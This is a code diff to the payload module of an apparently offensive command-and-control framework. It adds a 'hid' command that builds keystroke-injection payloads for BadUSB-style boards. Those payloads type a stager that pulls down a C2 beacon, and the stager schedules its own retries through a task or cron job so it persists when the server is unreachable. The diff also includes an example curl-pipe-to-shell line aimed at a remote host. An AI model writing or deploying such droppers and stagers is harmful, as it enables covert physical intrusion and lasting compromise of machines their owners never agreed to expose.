@@ -72,26 +72,20 @@ def _detect_os_from_xml(target: str) -> str:
 
 def _os_to_payload_hint(os_string: str) -> tuple:
     """
-    Given an OS string from nmap, return (arch, platform) hint.
-    Returns ("x64", "linux"), ("x86", "linux"), ("x64", "windows"), etc.
-    Defaults to ("x64", "linux") if unknown.
+    Given an OS string, return the (arch, platform) payload hint.
+
+    The classification belongs to `phantom.utils.target_platform` (ONE
+    source shared with the agent, the C2 shell and the network map): this
+    function only keeps the module's historical (arch, platform) shape.
     """
-    os_lower = os_string.lower()
-
-    platform = "linux"
-    if "windows" in os_lower:
-        platform = "windows"
-    elif "linux" in os_lower or "unix" in os_lower:
-        platform = "linux"
-
-    arch = "x64"
-    if "x86-64" in os_lower or "64-bit" in os_lower or "amd64" in os_lower:
-        arch = "x64"
-    elif "i386" in os_lower or "i686" in os_lower or "x86" in os_lower or "32-bit" in os_lower:
-        arch = "x86"
-    # Default to x64 if unclear
-
-    return arch, platform
+    from phantom.utils.target_platform import from_os_string
+    answer = from_os_string(os_string, source="os string")
+    if not answer.platform:
+        # no family in the string: keep the module's historical linux
+        # default, but the ARCH it stated is still real information
+        # ("Unknown i386 OS" is 32-bit even though it names no family)
+        return answer.arch, "linux"      # caller warns: see `_guess_os`
+    return answer.arch, answer.platform
 
 
 class PayloadModule(BaseModule):
@@ -102,6 +96,8 @@ class PayloadModule(BaseModule):
             {
                 "CORE": ["generate", "reverse [lhost] [lport]",
                           "bind [port]", "deploy", "privesc"],
+                "DELIVERY": ["hid <board> \"<command>\" [--target <os>] "
+                             "[--stager <os>] [--out <file>]"],
                 "LISTENER": ["handler <port> <payload>"],
             },
             self.suggest_commands(),
@@ -235,59 +231,195 @@ class PayloadModule(BaseModule):
             console.print("  - Check for writable /etc/passwd or /etc/shadow")
             console.print("  - Check sudo permissions (`sudo -l`)")
 
+    def do_hid(self, arg):
+        """hid <board> ["<command>" | --stager <os>] [flags]
+
+        Build a USB HID payload for a keyboard-injector board: AutoRun on
+        removable volumes is dead at the OS level, so the vector that works
+        is a board that TYPES the payload (RP2040/Pico with CircuitPython,
+        Flipper Zero BadUSB, O.MG cable, Arduino-IDE `Keyboard.h` boards).
+
+        Flags:
+          --target <os>   the OS the board will type into (windows|linux|
+                          macos|android): the command must match it, and
+                          nothing can detect it at runtime (9.2)
+          --stager <os>   build the PHANTOM stager for that OS with the
+                          current C2 endpoint and type THAT (instead of
+                          pasting a command by hand). The stager is
+                          RESILIENT: if the C2 is down when the board is
+                          plugged in, it schedules its own retry (Windows
+                          scheduled task / POSIX cron) so the beacon still
+                          lands once the C2 comes up — the operator types
+                          it once and walks away.
+          --out <file>    where to write the artefact (default:
+                          data/vectors/)
+          --delay <ms>    wait before typing (default 1500: the host has to
+                          enumerate the HID device first)
+          --no-enter      do not press Enter after the command
+          --run           open the run dialog first (Windows targets)
+
+        Examples:
+          payload hid pico --stager windows --target windows --run
+          payload hid flipper "curl -sk http://10.0.0.5:8443/x | sh" \
+              --target linux
+          payload hid omg --stager linux --target linux
+          payload hid arduino --stager windows --target windows --run
+        """
+        from phantom.utils.hid_builder import (
+            BOARDS, board_notes, build_hid_payload)
+
+        parts = arg.strip().split()
+        board = ""
+        command = ""
+        target = ""
+        stager = ""
+        out = ""
+        delay_ms = 1500
+        press_enter = True
+        open_run = False
+
+        i = 0
+        while i < len(parts):
+            tok = parts[i]
+            if tok == "--target" and i + 1 < len(parts):
+                target = parts[i + 1].lower()
+                i += 2
+                continue
+            if tok == "--stager" and i + 1 < len(parts):
+                stager = parts[i + 1].lower()
+                i += 2
+                continue
+            if tok == "--out" and i + 1 < len(parts):
+                out = parts[i + 1]
+                i += 2
+                continue
+            if tok == "--delay" and i + 1 < len(parts):
+                try:
+                    delay_ms = int(parts[i + 1])
+                except ValueError:
+                    notifier.error("--delay wants milliseconds")
+                    return
+                i += 2
+                continue
+            if tok == "--no-enter":
+                press_enter = False
+                i += 1
+                continue
+            if tok == "--run":
+                open_run = True
+                i += 1
+                continue
+            if not board and tok.lower() in BOARDS:
+                board = tok.lower()
+                i += 1
+                continue
+            # anything left is the command to type (quotes already stripped
+            # by the shell / the module's argument splitter)
+            command = (command + " " + tok).strip()
+            i += 1
+
+        if not board:
+            notifier.error(f"hid wants a board: {', '.join(BOARDS)}")
+            return
+        if stager:
+            if target and target != stager:
+                notifier.error(
+                    f"--stager {stager} but --target {target}: the board "
+                    f"types one artefact and PE ≠ ELF ≠ Mach-O — pick one.")
+                return
+            from phantom.utils.builder import generate_dropper
+            from phantom.utils import config as cfg
+            host = session.lhost or self._get_lhost()
+            port = cfg.get_int("c2.port", 8080, env="PHANTOM_C2_PORT")
+            command = generate_dropper(stager, host, port, use_ssl=True,
+                                       resilient=True)
+            target = target or stager
+            notifier.info(f"stager for {stager} built with the current C2 "
+                          f"endpoint ({host}:{port})")
+        if not command:
+            notifier.error("hid wants the command to type (or --stager <os>)")
+            return
+        try:
+            payload = build_hid_payload(board, command, target=target,
+                                        delay_ms=delay_ms,
+                                        press_enter=press_enter,
+                                        open_run=open_run)
+        except ValueError as exc:
+            notifier.error(str(exc))
+            return
+
+        import os
+        if not out:
+            from phantom.utils.paths import data_dir
+            out = os.path.join(data_dir(), "vectors",
+                               f"{board}_{payload.filename}")
+        os.makedirs(os.path.dirname(os.path.abspath(out)), exist_ok=True)
+        with open(out, "w", encoding="utf-8", newline="\n") as handle:
+            handle.write(payload.content)
+        notifier.success(f"HID payload written: {out}")
+        for note in payload.notes:
+            notifier.warn(note)
+        for note in board_notes(board):
+            notifier.info(note)
+        session.add_note(f"HID payload ({board}) -> {out}")
+
     def _get_lhost(self) -> str:
         """Auto-detect local IP (VPN/tun0 or default route)."""
         from phantom.utils.network import get_lhost
         return get_lhost()
 
     def _guess_os(self) -> tuple:
+        """Detect the target OS, in confidence order, and SAY when it failed.
+
+        Sources, best first: the shared WorldModel `os` finding (the senior
+        source — the scan wrote it there), the nmap XML saved by the scan,
+        the raw scan output held in the session. Returns
+        (os_string, arch, platform) as before.
+
+        When nothing was detected the answer is marked ASSUMED and the
+        operator is WARNED: the old code returned "Unknown (defaulting to
+        Linux x64)" in silence, and the caller shipped a Linux beacon to
+        targets that were never identified — the wrong kernel family, with
+        no trace of the guess.
         """
-        Try to detect target OS: shared WorldModel `os` finding first (the
-        senior source — scan wrote it there), then scan results.
-        Returns (os_string, arch, platform).
-        If detection fails, returns ("Unknown (defaulting to Linux x64)", "x64", "linux").
-        """
+        from phantom.utils.target_platform import (
+            assumed_linux, from_findings, from_os_string, resolve)
+
         target = session.target
-        if not target:
-            return "Unknown (defaulting to Linux x64)", "x64", "linux"
+        answer = None
 
         # 0. Shared WorldModel os finding (written by scan / reasoning)
         try:
             from phantom.core.knowledge import session_wm
-            os_f = session_wm().find("os")
-            if os_f and isinstance(os_f[0].value, dict):
-                name = str(os_f[0].value.get("os") or os_f[0].value.get("name") or "")
-                if name:
-                    low = name.lower()
-                    if "windows" in low:
-                        return f"{name} (from shared knowledge)", "x64", "windows"
-                    if "linux" in low or "ubuntu" in low or "debian" in low or "centos" in low:
-                        return f"{name} (from shared knowledge)", "x64", "linux"
+            answer = from_findings(session_wm(), source="shared knowledge")
         except Exception:
-            pass
+            answer = None
 
-        # 1. Try XML-based OS detection (most accurate)
-        os_string = _detect_os_from_xml(target)
-        if os_string:
-            arch, platform = _os_to_payload_hint(os_string)
-            return os_string, arch, platform
+        # 1. XML-based OS detection (most accurate string available)
+        if target and (answer is None or not answer.known):
+            xml_os = _detect_os_from_xml(target)
+            if xml_os:
+                answer = resolve(answer,
+                                 from_os_string(xml_os, source="scan XML"))
 
-        # 2. Fallback: scan raw output in session results
-        scan_data = session.get_result("scan")
-        if scan_data and isinstance(scan_data, dict):
-            all_output = " ".join(scan_data.values()).lower()
+        # 2. Fallback: the raw scan output held in the session
+        if answer is None or not answer.known:
+            scan_data = session.get_result("scan")
+            if scan_data and isinstance(scan_data, dict):
+                text = " ".join(str(v) for v in scan_data.values())
+                if text.strip():
+                    answer = resolve(answer,
+                                     from_os_string(text, source="scan output"))
 
-            if "windows" in all_output:
-                # Try to detect arch from output
-                arch = "x64" if "64-bit" in all_output or "x86_64" in all_output else "x86"
-                return f"Windows (detected from scan output)", arch, "windows"
-
-            if "linux" in all_output or "ubuntu" in all_output or "debian" in all_output or "centos" in all_output:
-                arch = "x64" if "64-bit" in all_output or "x86_64" in all_output else "x64"
-                return f"Linux (detected from scan output)", arch, "linux"
-
-        # 3. No data available
-        return "Unknown (defaulting to Linux x64)", "x64", "linux"
+        # 3. Nothing detected: state the default instead of hiding it
+        if answer is None or not answer.known:
+            answer = assumed_linux("no os signal")
+            notifier.warn(
+                f"OS del target non rilevato: uso il default "
+                f"{answer.platform}/{answer.arch} — se il target è "
+                f"Windows/macOS compila l'artefatto giusto (es. "
+                f"`generate windows`) o esegui un os_detect.")
+        return answer.os_name, answer.arch, answer.platform
 
     def _suggest_payload(self, arch: str, platform: str) -> str:
         """Return the suggested payload key based on detected OS."""
@@ -341,7 +473,12 @@ class PayloadModule(BaseModule):
                 notifier.warn(f"Sandbox preflight: {verdict.summary()}")
         except Exception:
             notifier.warn("Sandbox preflight unavailable (no backend) — skipping.")
-        dropper = generate_dropper(platform, c2_host, c2_port, use_ssl=True)
+        # RESILIENT by default: this one-liner is pasted by hand and may be
+        # run before the C2 is up (a physical drop, a staged exfil). If the
+        # first download fails it schedules its own retry with the endpoint
+        # already embedded, so the operator types it once and walks away.
+        dropper = generate_dropper(platform, c2_host, c2_port, use_ssl=True,
+                                   resilient=True)
         if not dropper:
             notifier.error("No dropper defined for this platform.")
             return
